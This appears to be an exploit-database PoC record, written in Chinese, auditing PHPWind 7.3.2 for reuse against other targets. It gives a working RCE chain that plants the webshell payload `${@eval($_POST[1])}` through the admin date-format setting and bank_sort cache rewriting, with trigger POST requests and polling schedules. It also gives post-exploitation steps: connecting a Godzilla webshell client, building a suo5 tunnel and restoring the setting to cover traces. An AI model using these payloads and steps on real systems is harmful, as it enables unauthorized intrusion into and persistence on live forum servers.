# PHPWind 7.3.2 系统性加固判死清单（bank_sort RCE 链 + pw_hack 写入面 + 权限模型全量审计）

- **code**: phpwind-7.3.2-系统性加固判死清单-bank_sort-rce-链-pw_hack-写入面-权限模型全量审计
- **kind**: poc
- **category**: rce
- **component**: PHPWind
- **versions**: 7.3.2（7.5 SP3 结构基本一致）
- **severity**: critical
- **language**: php
- **source**: manual
- **verified_note**: 部分验证：① bank_sort RCE 链的**payload 装填与渲染**已在两套真实部署上实测成功（前台银行页显示 `存款时间:${@eval($_POST[1])}`）；② 缓存重写尚未发生（等 `$bk_per` 到期），故 `verified=false`；③ 其余判死结论均为源码级 + 实测级确认（如 `hackcenter` 两套 DENY=14822B、`bakout`/`bakin` DENY、`setuser` 改密码正文为「只有创始人才能管理和编辑管理员帐号」且前台登录证伪、888 端口 403、3306/8888 不可达、16 个源码泄露后缀变体全 404、主站连发被 CC 拒）。
- **path**: pocs/phpwind-7.3.2-系统性加固判死清单-bank_sort-rce-链-pw_hack-写入面-权限模型全量审计/phpwind-732-audit-verdicts.txt
- **tags**: phpwind,7.3.2,bank_sort,rce,判死清单,权限模型,pw_hack,复用价值
- **created_at**: 2026-10-06T23:30:17.889Z
- **found_by**: exploit

## 描述

这是一份"哪些路能走、哪些路被什么机制堵死"的全量审计结论，用于同平台其它靶标直接复用，避免重复劳动。所有"判死"项都在真实目标（203.0.113.126 上三套 PHPWind 7.3.2：example.com / example.com / example.com）上做过源码级或实测级确认。
【核心可用链】bank_sort RCE：`hack/bank/example.com:55` 条件 `!$bk_per || $timestamp - pwFilemtime(D_P."data/bbscache/bank_sort.php") > $bk_per*3600` ⇒ `savearray()`（:362-373，双引号串 + 仅 addslashes ⇒ `${}` 不被转义）把 `get_date()` 输出写进 `bank_sort.php`，L76 **同请求 include** ⇒ 代码执行。payload 可用后台 `settings&admintype=basic` 的 `config[datefm]` 装填（无长度限制，反斜杠转义 gmdate 格式字符后原样输出）。
【关键语义】`pwFilemtime()`（require/target105.example.com:1057）= `file_exists($file) ? intval(filemtime($file)+$db_cvtime*60) : 0` ⇒ **文件不存在时返回 0** ⇒ 删掉 `bank_sort.php` 必然触发重写（`$timestamp`≈1.79e9 ≫ `$bk_per*3600`，与 `$bk_per` 多大无关）；但全量 `P_unlink` 扫描无一处能指向它（路径全带固定前缀/后缀或来自 readdir）。
【pw_hack 写入面 14 处】只有 2 类能写 `bk_per`：`hack/bank/example.com:58`（`"bk_$key"`，`$key` 可控 ⇒ `config[per]=0` 即写 `bk_per=0`，随后**立即 `updatecache_bk()`**，是唯一"即时触发"路径）与 `hack/blog/example.com:30`/`hack/medal/example.com:28`（`foreach($config as $key=>$value)` ⇒ **hk_name 无前缀**，理论上可写 `bk_per`）。**但三者同属 `example.com:26` 的 `$rightset['hackcenter']` 单一门禁**。其余：`mode/area/*` 键名硬编码、`apps/*` 与 `mode/o/admin/global.php` 前缀 `o_`、`admin/sitemap.php` 前缀 `sm_`、`admin/customnav.php` 硬编码 `area_navshow`、`lib/target277.example.com:100` 前缀 `KEY`/`ID`、`mode/area/require/target148.example.com:28` 硬编码 `area_static_next`。
【权限模型】`admin/example.com:226-279 checkpass()`：用户名命中 `data/sql_config.php` 的 `$manager` + 密码 + `admincheck` ⇒ `If_manager=1` 且 `$rightset` **全 1**（含 `hackcenter`）；否则 `$rightset = unserialize(pw_adminset[gid=groupid])`。而 `$manager` 只能由 `admin/manager.php` 写，它需要 `If_manager=1` ⇒ **自举死循环**。
【全量判死项】① `key_cv()`（admin/target117.example.com:1124）只保留 `[\d\w_]` ⇒ 经 `updatecache_bk()`/`updatecache_conf()` 的缓存生成器注入 PHP 全灭；② `Pcv()`（target105.example.com:372）拦 `..`，`writeover()` 内部第一行就调用它；③ `admin/target188.example.com:136-155` 的 `action=editcss`（唯一写 `data/style/*_css.htm` 的代码）**整块被注释** ⇒ `admin/target117.example.com:644` 的 `eval("\$style_css = \"$style_css\";")` 拿不到可控数据（19 个字段全过 `pw_var_export`）；④ `admin/target218.example.com:318` 的 `manager_right` 检查在 `$db->update`（456 行）**之前**且 `adminmsg()` 终止执行 ⇒ 改 groupid=3 的管理员密码判死（实测：POST 后正文「只有创始人才能管理和编辑管理员帐号」，且前台用新密码登录返回「密码错误」）；⑤ `admin/target278.example.com:138` 删除条件 `strpos($filename,'mode_'.$m)` ⇒ 删不到 `bank_sort.php`；⑥ `admin/target279.example.com:10` 是裸 SQL 拼接（`"$action TABLE $table EXTENDED"`）但 MySQL 单语句限制；⑦ `admin/bakup.php` 的 `bakindata()` 按行以 `;` 结尾即执行 ⇒ 支持多语句、是**唯一**能执行任意 SQL 的入口，但 `$rightset['bakout']`/`['bakin']` 常为 0（注意权限键是 `bakout`/`bakin` 而非 `bakup`）；⑧ 主站 CC 防护（`$db_cc`）对 10 秒间隔的连发即拒（curl 返回 000）。

## 用法

```
1) 侦察阶段先确认三件事：① 后台 `adminjob=hack&hackset=bank` 是否 148xx「您没有权限」（是 ⇒ 无 hackcenter，走等待路线）；② `pw_hack` 表 `bk_per` 是否存在及值（需 DB 读取能力，否则靠窗口收敛）；③ `hack/bank/example.com` 是否存在（存在即有该链）。
2) 有 `settings&admintype=basic` 权限时：用它把 `config[datefm]` 装填成 `${@eval($_POST[1])}`，并在前台银行页验证 payload 已渲染。
3) 无 hackcenter 时：计算窗口 `T0 + $bk_per 小时`（T0 = 首次访问银行页时间），按 12 分钟一发长期轮询 `POST /bbs/example.com?H_name=bank` body `1=<payload>`；命中判据 `PWOK9X` 或 phpinfo 特征。
4) 命中后立刻：GET 确认马落地 → 哥斯拉客户端实测（PHP_XOR_BASE64，注意 disable_functions 会禁 system/exec，用文件管理验证）→ 建 suo5 隧道 → 还原 `config[datefm]` 为 `yyyy-mm-dd`。
5) 若想走即时触发：必须拿到 `hackcenter`（= 用户名命中 `data/sql_config.php` 的 `$manager` 且密码通过）。
```

## 正文

```
# 一、核心可用链（bank_sort RCE）—— 只需等缓存重写窗口
# hack/bank/example.com:4    require_once(D_P.'data/bbscache/bk_config.php');   // 必须存在，否则 fatal
# hack/bank/example.com:55   if (!$bk_per || $timestamp - pwFilemtime(D_P."data/bbscache/bank_sort.php") > $bk_per*3600) {
# hack/bank/example.com:60       $deposit['startdate'] = get_date($deposit['startdate']);   // ★ payload 从 $db_datefm 注入
# hack/bank/example.com:74       writeover(D_P.'data/bbscache/bank_sort.php',"<?php\r\n".$wirtedb.'?>');
# hack/bank/example.com:76   include(D_P."data/bbscache/bank_sort.php");              // ★ 同请求 include ⇒ RCE
# hack/bank/example.com:362-373  function savearray($name,$array){ ... $arraydb .= '"'.addslashes($value2).'",'; }  // 双引号 + 仅 addslashes ⇒ ${} 求值

# 触发 POST（带 payload，命中即落马）
# POST /bbs/example.com?H_name=bank   body: 1=${@eval($_POST[1])}   ← 用 --data-urlencode 提交
# 判据：响应出现 PWOK9X / phpinfo 特征；或排行榜表格出现数据行（= 已重写）

# 二、装填 payload（后台 settings，basic 分组有权限时）
# POST /bbs/example.com?adminjob=settings&admintype=basic   body: step=2&config[datefm]=${@eval($_POST[1])}&<其余字段全量回放>
# 验证：前台银行页显示 "存款时间:${@eval($_POST[1])} HH:MM"

# 三、即时触发（唯一，需 hackcenter）
# POST /bbs/example.com?adminjob=hack&hackset=bank&verify=<v>  body: action=unsubmit&config[per]=0&config[num]=10&...
#   ⇒ hack/bank/example.com:53-62 写 pw_hack.bk_per='0' + 立即 updatecache_bk() ⇒ bk_config.php 里 $bk_per='0'
#   ⇒ !$bk_per 恒真 ⇒ 每次访问银行页都重写并 include ⇒ 当场 RCE

# 四、判断当前等待窗口（$bk_per 未知时的收敛）
# 首次访问银行页时间 T0 + $bk_per 小时 = 重写窗口。已知实测：$bk_per>=2 被排除(07:15 未命中)...
# 常见值 2/6/12/24 ⇒ 窗口 T0+2h / T0+6h / T0+12h / T0+24h

# 五、其它可用的辅助事实
# - admin/example.com:82  include_once(D_P.'data/sql_config.php');  ⇒ $manager / $manager_pwd 明文所在（拿不到=读不了）
# - admin/example.com:181 !defined('If_manager') && define('If_manager',0);
# - admin/example.com:293-324 adminmsg() 末尾 afooter()（会终止执行，实测确认）
# - require/target105.example.com:231-241 writeover() 内含 touch()（单参数，只更新为当前时间）+ chmod 0777
# - require/target105.example.com:1057  pwFilemtime() 不存在文件返回 0  ← 删文件的威力所在
# - admin/cache.php:5-45   updatecache() 全量重建（含 updatecache_bk()），入口 admin/target280.example.com:12 `$_POST['action']=='cache'`
# - admin/target117.example.com:771-781 updatecache_bk() 读 pw_hack WHERE hk_name LIKE 'bk_%' 写 data/bbscache/bk_config.php

```
